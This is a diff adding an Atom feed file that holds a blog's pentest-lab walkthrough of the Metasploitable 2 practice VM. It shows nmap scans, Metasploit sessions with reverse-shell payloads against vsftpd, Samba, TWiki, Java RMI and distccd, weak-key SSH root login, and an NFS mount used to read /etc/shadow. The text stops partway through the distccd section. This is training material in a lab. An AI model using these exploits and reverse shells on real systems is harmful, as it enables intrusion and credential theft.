@@ -1,0 +1,1338 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
+  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
+  <link href="http://chousensha.github.io/"/>
+  <updated>2014-06-08T18:33:38+03:00</updated>
+  <id>http://chousensha.github.io/</id>
+  <author>
+    <name><![CDATA[chousensha]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Metasploitable 2]]></title>
+    <link href="http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/"/>
+    <updated>2014-06-03T21:16:09+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2</id>
+    <content type="html"><![CDATA[<p>Today I will walk through different ways of exploiting Metasploitable 2, the newer release of Rapid7&rsquo;s popular vulnerable machine. First, what is Metasploitable?</p>
+
+<!-- more -->
+
+
+<blockquote><p>Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be
+used to conduct security training, test security tools, and practice common
+penetration testing techniques.</p></blockquote>
+
+<p>In my lab environment, the IP of the attacker machine is 192.168.127.159, and the victim machine is 192.168.127.154.</p>
+
+<p>Since this is a test lab, I won&rsquo;t be concerned about stealth. Instead, I will try to get the most information out of the scans.</p>
+
+<p>Let&rsquo;s start by port scanning the target with nmap. I did a full port, aggresive scan against the target. Here are the results.</p>
+
+<p>``` plain
+nmap -p1-65535 -A 192.168.127.154</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-03 21:33 EEST
+Nmap scan report for 192.168.127.154
+Host is up (0.00047s latency).
+Not shown: 65505 closed ports
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.3.4
+|<em>ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|</em>  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp    open  telnet      Linux telnetd
+25/tcp    open  smtp        Postfix smtpd
+|<em>smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2010-03-17T14:07:45+00:00
+|</em>Not valid after:  2010-04-16T13:07:45+00:00
+|<em>ssl-date: 2014-06-03T18:35:26+00:00; -1s from local time.
+53/tcp    open  domain      ISC BIND 9.4.2
+| dns-nsid:
+|</em>  bind.version: 9.4.2
+80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|</em>http-title: Metasploitable2 &ndash; Linux
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      46385/tcp  mountd
+|   100005  1,2,3      47809/udp  mountd
+|   100021  1,3,4      47120/udp  nlockmgr
+|   100021  1,3,4      53013/tcp  nlockmgr
+|   100024  1          34130/tcp  status
+|<em>  100024  1          45305/udp  status
+139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+512/tcp   open  exec        netkit-rsh rexecd
+513/tcp   open  login?
+514/tcp   open  tcpwrapped
+1099/tcp  open  java-rmi    Java RMI Registry
+1524/tcp  open  shell       Metasploitable root shell
+2049/tcp  open  nfs         2-4 (RPC #100003)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      46385/tcp  mountd
+|   100005  1,2,3      47809/udp  mountd
+|   100021  1,3,4      47120/udp  nlockmgr
+|   100021  1,3,4      53013/tcp  nlockmgr
+|   100024  1          34130/tcp  status
+|</em>  100024  1          45305/udp  status
+2121/tcp  open  ftp         ProFTPD 1.3.1
+3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
+| mysql-info:
+|   Protocol: 53
+|   Version: .0.51a-3ubuntu5
+|   Thread ID: 8
+|   Capabilities flags: 43564
+|   Some Capabilities: ConnectWithDatabase, SwitchToSSLAfterHandshake, Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag
+|   Status: Autocommit
+|<em>  Salt: (eFoz:O<sup>m</sup>'yLR5Qw&amp;RJ\
+3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 &ndash; 8.3.7
+5900/tcp  open  vnc         VNC (protocol 3.3)
+| vnc-info:
+|   Protocol version: 3.3
+|   Security types:
+|</em>    Unknown security type (33554432)
+6000/tcp  open  X11         (access denied)
+6667/tcp  open  irc         Unreal ircd
+| irc-info:
+|   server: irc.Metasploitable.LAN
+|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
+|   servers: 1
+|   users: 1
+|   lservers: 0
+|   lusers: 1
+|   uptime: 0 days, 0:07:28
+|   source host: 7FA0EA81.B1DFC955.FFFA6D49.IP
+|<em>  source ident: nmap
+6697/tcp  open  irc         Unreal ircd
+8009/tcp  open  ajp13?
+| ajp-auth:
+|</em>  ERROR: Failed to connect to AJP server
+| ajp-methods:
+|<em>  ERROR: Failed to connect to server
+8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+34130/tcp open  status      1 (RPC #100024)
+46385/tcp open  mountd      1-3 (RPC #100005)
+50867/tcp open  unknown
+53013/tcp open  nlockmgr    1-4 (RPC #100021)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      46385/tcp  mountd
+|   100005  1,2,3      47809/udp  mountd
+|   100021  1,3,4      47120/udp  nlockmgr
+|   100021  1,3,4      53013/tcp  nlockmgr
+|   100024  1          34130/tcp  status
+|</em>  100024  1          45305/udp  status
+MAC Address: 00:0C:29:2E:6D:70 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 &ndash; 2.6.33
+Network Distance: 1 hop
+Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p>
+
+<p>Host script results:
+|<em>nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name:
+|   Workgroup: WORKGROUP
+|</em>  System time: 2014-06-03T14:35:26-04:00</p>
+
+<p>TRACEROUTE
+HOP RTT     ADDRESS
+1   0.47 ms 192.168.127.154</p>
+
+<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 284.64 seconds
+```</p>
+
+<p>Ok, there are plenty of services just waiting for our attention. So let&rsquo;s check each port and see what we get.</p>
+
+<h3>Port 21 vsftpd</h3>
+
+<p>There is an exploit available in Metasploit for the vsftpd version.</p>
+
+<p>``` plain
+msf > search vsftpd</p>
+
+<h1>Matching Modules</h1>
+
+<p>   Name                                  Disclosure Date  Rank       Description</p>
+
+<hr />
+
+<p>   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
+```</p>
+
+<p>The description from Rapid7 site:</p>
+
+<p><strong>VSFTPD v2.3.4 Backdoor Command Execution</strong></p>
+
+<blockquote><p>This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the
+vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was
+removed on July 3rd 2011.</p></blockquote>
+
+<p>Let&rsquo;s leverage it and get a shell:</p>
+
+<p>``` plain
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > show options</p>
+
+<p>Module options (exploit/unix/ftp/vsftpd_234_backdoor):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST                   yes       The target address
+   RPORT  21               yes       The target port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic</p>
+
+<p>msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154
+msf exploit(vsftpd_234_backdoor) > show payloads</p>
+
+<h1>Compatible Payloads</h1>
+
+<p>   Name               Disclosure Date  Rank    Description</p>
+
+<hr />
+
+<p>   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection</p>
+
+<p>msf exploit(vsftpd_234_backdoor) > set payload cmd/unix/interact
+payload => cmd/unix/interact
+msf exploit(vsftpd_234_backdoor) > show options</p>
+
+<p>Module options (exploit/unix/ftp/vsftpd_234_backdoor):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST  192.168.127.154  yes       The target address
+   RPORT  21               yes       The target port</p>
+
+<p>Payload options (cmd/unix/interact):</p>
+
+<p>   Name  Current Setting  Required  Description</p>
+
+<hr />
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic</p>
+
+<p>msf exploit(vsftpd_234_backdoor) > exploit</p>
+
+<p>[<em>] Banner: 220 (vsFTPd 2.3.4)
+[</em>] USER: 331 Please specify the password.
+[+] Backdoor service has been spawned, handling&hellip;
+[+] UID: uid=0(root) gid=0(root)
+[<em>] Found shell.
+[</em>] Command shell session 1 opened (192.168.127.159:57936 &ndash;> 192.168.127.154:6200) at 2014-06-03 22:42:36 +0300</p>
+
+<p>whoami
+root
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+```</p>
+
+<p>Aaand we own the machine! Now let&rsquo;s move on.</p>
+
+<h3>Port 22 ssh</h3>
+
+<p>The OpenSSL package installed on the system is vulnerable to a bruteforce exploit  due to a random number generator weakness. Here&rsquo;s the overview and the CVE number:</p>
+
+<p><strong>CVE-2008-0166</strong></p>
+
+<blockquote><p>OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable > numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.</p></blockquote>
+
+<p>I chose the following Ruby exploit:</p>
+
+<p><a href="http://www.exploit-db.com/exploits/5632/">http://www.exploit-db.com/exploits/5632/</a></p>
+
+<p>Before running it, you have to download the precalculated vulnerable keys from:</p>
+
+<p><a href="http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2</a>  # for dsa keys</p>
+
+<p><a href="http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2</a> # for rsa keys</p>
+
+<p>Then I ran the script as follows:</p>
+
+<p><code>plain
+ruby ./5632.rb 192.168.127.154 root ~/rsa/2048/
+</code></p>
+
+<p>You can consult the source for more information, basically this checks if the root account has a weak SSH key, testing each key in the directory where you placed the keys. Upon a hit, you will see something like this:</p>
+
+<p>``` plain
+KEYFILE FOUND:</p>
+
+<p>57c3115d77c56390332dc5c49978627a-5429
+```</p>
+
+<p>After finding the key, you can use it to log in as root via ssh:</p>
+
+<p><code>plain
+ssh -l root -p 22 -i 57c3115d77c56390332dc5c49978627a-5429 192.168.127.154
+</code></p>
+
+<h3>Port 23 telnet</h3>
+
+<p>For this one I used an auxiliary module:</p>
+
+<p>``` plain
+msf > use auxiliary/scanner/telnet/telnet_version
+msf auxiliary(telnet_version) > show options</p>
+
+<p>Module options (auxiliary/scanner/telnet/telnet_version):</p>
+
+<p>   Name      Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   PASSWORD                   no        The password for the specified username
+   RHOSTS                     yes       The target address range or CIDR identifier
+   RPORT     23               yes       The target port
+   THREADS   1                yes       The number of concurrent threads
+   TIMEOUT   30               yes       Timeout for the Telnet probe
+   USERNAME                   no        The username to authenticate as</p>
+
+<p>msf auxiliary(telnet_version) > set RHOSTS 192.168.127.154
+RHOSTS => 192.168.127.154
+msf auxiliary(telnet_version) > run</p>
+
+<p>[<em>] 192.168.127.154:23 TELNET _                  _       _ _        _     _      <em><em><strong>  \x0a _ </strong> </em><strong>   </strong></em>| |<em> <strong> _ </strong></em> _ <strong> | | </strong><em> (</em>) |<em> __ </em>| |<strong> | | </strong><em>|</em><strong> \ \x0a| &lsquo;_ <code>_ \ / _ \ __/ _</code> / </strong>| &rsquo;<em> \| |/ _ \| | __/ </em>` | &lsquo;<em> \| |/ _ \ <strong>) |\x0a| | | | | |  </strong>/ || (</em>| _<em> \ |</em>) | | (<em>) | | || (</em>| | |<em>) | |  <strong>// </strong>/ \x0a|</em>| |<em>| |</em>|_<strong>|_<em>_</em>,<em>|</em></strong>/ .<strong>/|_|_</strong>/|<em>|_</em>_<em>,</em>|<em>.__/|</em>|_<strong>|</strong><em>__|\x0a                            |</em>|                                          \x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
+[</em>] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```</p>
+
+<p>So now we know the credentials for the msfadmin account, and if you log in and play around you will find out that this accound has sudo privilege, so it&rsquo;s possible to run commands as root.</p>
+
+<h3>Port 80 apache</h3>
+
+<p>Navigating to the root of the web server, we can see some vulnerable web applications, along with the msfadmin account details which we got earlier with telnet. I won&rsquo;t go over the web applications here, because I am focusing on host based exploitation in this post. However, I found out that I could use Metasploit against one of them to get a shell, so I will detail that here.</p>
+
+<p>The Nessus scan revealed that the TWiki web application is vulnerable to remote code execution. I found the following suitable exploit:</p>
+
+<p><strong>TWiki History TWikiUsers rev Parameter Command Execution</strong></p>
+
+<blockquote><p>This module exploits a vulnerability in the history component of TWiki. By passing a &lsquo;rev&rsquo; parameter containing shell metacharacters to the
+TWikiUsers script, an attacker can execute arbitrary OS commands.</p></blockquote>
+
+<p>``` plain
+msf > use exploit/unix/webapp/twiki_history
+msf exploit(twiki_history) > show options</p>
+
+<p>Module options (exploit/unix/webapp/twiki_history):</p>
+
+<p>   Name     Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   Proxies                   no        Use a proxy chain
+   RHOST                     yes       The target address
+   RPORT    80               yes       The target port
+   URI      /twiki/bin       yes       TWiki bin directory path
+   VHOST                     no        HTTP server virtual host</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic</p>
+
+<p>msf exploit(twiki_history) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154
+msf exploit(twiki_history) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(twiki_history) > exploit</p>
+
+<p>[<em>] Started reverse double handler
+[</em>] Accepted the first client connection&hellip;
+[<em>] Accepted the second client connection&hellip;
+[</em>] Command: echo ZeiYbclsufvu4LGM;
+[<em>] Writing to socket A
+[</em>] Writing to socket B
+[<em>] Reading from sockets&hellip;
+[</em>] Successfully sent exploit request
+[<em>] Reading from socket B
+[</em>] B: &ldquo;ZeiYbclsufvu4LGM\r\n&rdquo;
+[<em>] Matching&hellip;
+[</em>] A is input&hellip;
+[<em>] Accepted the first client connection&hellip;
+[</em>] Accepted the second client connection&hellip;
+[<em>] Command: echo D0Yvs2n6TnTUDmPF;
+[</em>] Writing to socket A
+[<em>] Writing to socket B
+[</em>] Reading from sockets&hellip;
+[<em>] Command shell session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:54381) at 2014-06-08 17:31:48 +0300
+[</em>] Reading from socket B
+[<em>] B: &ldquo;D0Yvs2n6TnTUDmPF\r\n&rdquo;
+[</em>] Matching&hellip;
+[*] A is input&hellip;</p>
+
+<p>whoami
+www-data
+```</p>
+
+<p>This is a low privilege shell, but we can escalate to root via the udev exploit, as shown later.</p>
+
+<h3>Port 445 samba</h3>
+
+<p>First, I&rsquo;ll use an auxiliary module to get the server&rsquo;s version:</p>
+
+<p>``` plain
+msf > use auxiliary/scanner/smb/smb_version
+msf auxiliary(smb_version) > show options</p>
+
+<p>Module options (auxiliary/scanner/smb/smb_version):</p>
+
+<p>   Name       Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOSTS                      yes       The target address range or CIDR identifier
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                yes       The number of concurrent threads</p>
+
+<p>msf auxiliary(smb_version) > set RHOSTS 192.168.127.154
+RHOSTS => 192.168.127.154
+msf auxiliary(smb_version) > run</p>
+
+<p>[<em>] 192.168.127.154:445 is running Unix Samba 3.0.20-Debian (language: Unknown) (domain:WORKGROUP)
+[</em>] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```</p>
+
+<p>With that information in hand, we can now use a suitable exploit against the target:</p>
+
+<p><strong>Samba &ldquo;username map script&rdquo; Command Execution</strong></p>
+
+<blockquote><p>This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default &ldquo;username map
+script&rdquo; configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No
+authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p></blockquote>
+
+<p>``` plain
+msf > use exploit/multi/samba/usermap_script
+msf exploit(usermap_script) > show options</p>
+
+<p>Module options (exploit/multi/samba/usermap_script):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST                   yes       The target address
+   RPORT  139              yes       The target port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic</p>
+
+<p>msf exploit(usermap_script) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154
+msf exploit(usermap_script) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(usermap_script) > show options</p>
+
+<p>Module options (exploit/multi/samba/usermap_script):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST  192.168.127.154  yes       The target address
+   RPORT  139              yes       The target port</p>
+
+<p>Payload options (cmd/unix/reverse):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic</p>
+
+<p>msf exploit(usermap_script) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+msf exploit(usermap_script) > set RPORT 445
+RPORT => 445
+msf exploit(usermap_script) > exploit</p>
+
+<p>[<em>] Started reverse double handler
+[</em>] Accepted the first client connection&hellip;
+[<em>] Accepted the second client connection&hellip;
+[</em>] Command: echo f8rjvIDZRdKBtu0F;
+[<em>] Writing to socket A
+[</em>] Writing to socket B
+[<em>] Reading from sockets&hellip;
+[</em>] Reading from socket B
+[<em>] B: &ldquo;f8rjvIDZRdKBtu0F\r\n&rdquo;
+[</em>] Matching&hellip;
+[<em>] A is input&hellip;
+[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:46653) at 2014-06-04 22:23:23 +0300</p>
+
+<p>whoami
+root</p>
+
+<p>```</p>
+
+<h3>Port 514 tcpwrapped</h3>
+
+<p>The nmap scan revealed the port is open but it&rsquo;s tcpwrapped. Let&rsquo;s first see what that means:</p>
+
+<blockquote><p>TCP Wrapper is a host-based networking access control list system, used to filter network access to Internet Protocol servers on (Unix-
+like) operating systems such as Linux or BSD.  (Wikipedia)</p></blockquote>
+
+<p>So we can conclude the port is protected by TCP Wrapper. If we try to netcat to the port, we see this:</p>
+
+<p>``` plain
+nc -vvn 192.168.127.154 514</p>
+
+<p>(UNKNOWN) [192.168.127.154] 514 (shell) open
+```</p>
+
+<p>I ran a Nessus scan against the target, and according to the report, a critical vulnerability is present on this port:</p>
+
+<p><strong>rsh Unauthenticated Access (via finger Information)</strong></p>
+
+<p><strong>Synopsis</strong></p>
+
+<p>It was possible to log on this machine without password.</p>
+
+<p><strong>Description</strong></p>
+
+<p>Using common usernames as well as the usernames reported by &lsquo;finger&rsquo;, Nessus was able to log in through rsh. Either the accounts are not protected by passwords or the ~/.rhosts files are not configured properly.</p>
+
+<p>This vulnerability is confirmed to exist in Cisco Prime LAN Management Solution, but could be present on any host that is not securely configured.</p>
+
+<p><strong>Port</strong><br/>
+tcp/514</p>
+
+<p>So all we have to do is log in via the remote shell program:</p>
+
+<p>``` plain
+rsh 192.168.127.154</p>
+
+<p>Last login: Wed May  7 11:00:37 EDT 2014 from :0.0 on pts/0</p>
+
+<p>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</p>
+
+<p>The programs included with the Ubuntu system are free software;</p>
+
+<p>the exact distribution terms for each program are described in the</p>
+
+<p>individual files in /usr/share/doc/*/copyright.</p>
+
+<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</p>
+
+<p>applicable law.</p>
+
+<p>To access official Ubuntu documentation, please visit:</p>
+
+<p><a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a></p>
+
+<p>You have mail.</p>
+
+<p>root@metasploitable:~#
+```</p>
+
+<h3>Port 1099 java-rmi</h3>
+
+<p>Let&rsquo;s continue our exploitation. Anything labeled Java is bound to be interesting from a security perspective :)</p>
+
+<p>Searching for Java exploits yielded something interesting:</p>
+
+<p><strong>Java RMI Server Insecure Default Configuration Java Code Execution</strong></p>
+
+<blockquote><p>This module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from
+any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be
+used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java
+Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java
+process. RMI method calls do not support or require any sort of authentication.</p></blockquote>
+
+<p>``` plain
+msf > use exploit/multi/misc/java_rmi_server<br/>
+msf exploit(java_rmi_server) > show options</p>
+
+<p>Module options (exploit/multi/misc/java_rmi_server):</p>
+
+<p>   Name     Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST                     yes       The target address
+   RPORT    1099             yes       The target port
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  8080             yes       The local port to listen on.
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Generic (Java Payload)</p>
+
+<p>msf exploit(java_rmi_server) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154</p>
+
+<p>msf exploit(java_rmi_server) > set payload java/meterpreter/reverse_tcp
+payload => java/meterpreter/reverse_tcp
+msf exploit(java_rmi_server) > show options</p>
+
+<p>Module options (exploit/multi/misc/java_rmi_server):</p>
+
+<p>   Name     Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST    192.168.127.154  yes       The target address
+   RPORT    1099             yes       The target port
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  8080             yes       The local port to listen on.
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)</p>
+
+<p>Payload options (java/meterpreter/reverse_tcp):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Generic (Java Payload)</p>
+
+<p>msf exploit(java_rmi_server) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+msf exploit(java_rmi_server) > exploit</p>
+
+<p>[<em>] Started reverse handler on 192.168.127.159:4444
+[</em>] Using URL: <a href="http://0.0.0.0:8080/oVUJAkfU">http://0.0.0.0:8080/oVUJAkfU</a>
+[<em>]  Local IP: <a href="http://192.168.127.159:8080/oVUJAkfU">http://192.168.127.159:8080/oVUJAkfU</a>
+[</em>] Connected and sending request for <a href="http://192.168.127.159:8080/oVUJAkfU/WAHKp.jar">http://192.168.127.159:8080/oVUJAkfU/WAHKp.jar</a>
+[<em>] 192.168.127.154  java_rmi_server &ndash; Replied to request for payload JAR
+[</em>] Sending stage (30355 bytes) to 192.168.127.154
+[<em>] Meterpreter session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:36965) at 2014-06-04 22:42:17 +0300
+[+] Target 192.168.127.154:1099 may be exploitable&hellip;
+[</em>] Server stopped.</p>
+
+<p>meterpreter > getuid
+Server username: root
+meterpreter >
+```</p>
+
+<h3>Port 1524 shell</h3>
+
+<p>Well, not much to say here. There&rsquo;s already a nice, cozy shell waiting for connections, so nothing extra needs to be done.</p>
+
+<h3>Port 2049 nfs</h3>
+
+<p>Let&rsquo;s use the the <strong>showmount</strong> command to see the NFS server&rsquo;s export list. This command displays mount information for an NFS server. The -e flag is for showing exports:</p>
+
+<p>``` plain
+showmount -e 192.168.127.154</p>
+
+<p>Export list for 192.168.127.154:</p>
+
+<p>/ *
+```</p>
+
+<p>How nice! The root directory is shared. So, let&rsquo;s mount it then:</p>
+
+<p>``` plain
+mkdir /metafs # this will be the mount point</p>
+
+<p>mount -t nfs 192.168.127.154:/ /metafs -o nolock # mount the remote shared directory as nfs and disable file locking
+```</p>
+
+<p>Now we can read  the passwords and everything else:</p>
+
+<p>``` plain
+cat /metafs/etc/shadow</p>
+
+<p>root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::</p>
+
+<p>&hellip;&hellip;&hellip;.etc&hellip;&hellip;&hellip;.
+```</p>
+
+<h3>Port 3306 mysql</h3>
+
+<p>The Nessus scan that I ran against the target revealed the following:</p>
+
+<p><strong>MySQL Unpassworded Account Check</strong></p>
+
+<p><strong>Synopsis</strong></p>
+
+<p>The remote database server can be accessed without a password.</p>
+
+<p><strong>Description</strong></p>
+
+<p>It is possible to connect to the remote MySQL database server using an unpassworded account. This may allow an
+attacker to launch further attacks against the database.</p>
+
+<p>The &lsquo;root&rsquo; account does not have a password.
+Here is the list of databases on the remote server :
+&ndash; information_schema
+&ndash; dvwa
+&ndash; metasploit
+&ndash; mysql
+&ndash; owasp10
+&ndash; tikiwiki
+&ndash; tikiwiki195</p>
+
+<p>Let&rsquo;s see if we can indeed connect to the database as root without a password:</p>
+
+<p>``` plain
+mysql -u root -p -h 192.168.127.154
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 7
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)</p>
+
+<p>Copyright &copy; 2000, 2014, Oracle and/or its affiliates. All rights reserved.</p>
+
+<p>Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.</p>
+
+<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>
+
+<p>mysql>
+```</p>
+
+<p>Now we can look inside the databases and get any data that might interest us.</p>
+
+<h3>Port 3632 distccd</h3>
+
+<p>distccd  is  the  server  for  the  distcc distributed compiler. It accepts and runs compilation jobs for network clients. Metasploit has an exploit avaiable for this:</p>
+
+<p><strong>DistCC Daemon Command Execution</strong></p>
+
+<blockquote><p>This module uses a documented security weakness to execute arbitrary commands on any system running distccd.</p></blockquote>
+
+<p>``` plain
+msf > use exploit/unix/misc/distcc_exec
+msf exploit(distcc_exec) > show options</p>
+
+<p>Module options (exploit/unix/misc/distcc_exec):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST                   yes       The target address
+   RPORT  3632             yes       The target port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic Target</p>
+
+<p>msf exploit(distcc_exec) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154
+msf exploit(distcc_exec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(distcc_exec) > show options</p>
+
+<p>Module options (exploit/unix/misc/distcc_exec):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
